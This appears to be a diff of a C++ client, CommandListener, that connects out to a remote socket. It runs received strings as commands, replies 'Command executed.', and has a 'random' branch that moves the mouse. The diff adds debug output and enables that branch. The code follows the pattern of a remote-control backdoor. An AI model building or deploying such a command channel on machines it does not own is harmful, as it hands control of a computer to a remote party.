@@ -18,8 +18,10 @@ void CommandListener::startListening()
 {
   connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
   while (1) {
-    ZeroMemory(message, 200);
+    cout << "Begin of the loop" << endl;
+    memset(message, 0, sizeof(message));
     r = recv(sConnect, message, sizeof(message), 0);
+    cout << r << endl;
     cout << message << endl;
     handleCommand(message);
   }
@@ -48,13 +50,14 @@ void CommandListener::handleCommand(const char* cmd)
   // git blame yoyopig
   if(strcmp(cmd, "stop") == 0)
   {
+    cout << "In stop" << endl;
     StopAllThreads sat;
     sat();
   }
   else if(strcmp(cmd, "random") == 0)
   {
-    // RandomMouse rdm;
-    // this->tp.setThread(&rdm);
+    RandomMouse rdm;
+    this->tp.setThread(&rdm);
   }
   else
   {
@@ -64,7 +67,6 @@ void CommandListener::handleCommand(const char* cmd)
     char done[30] = "Command executed.\n";
     send(sConnect,done,(int)strlen(done),0);
   }
-  
 }
 
 string CommandListener::executeCommand(const char* cmd)
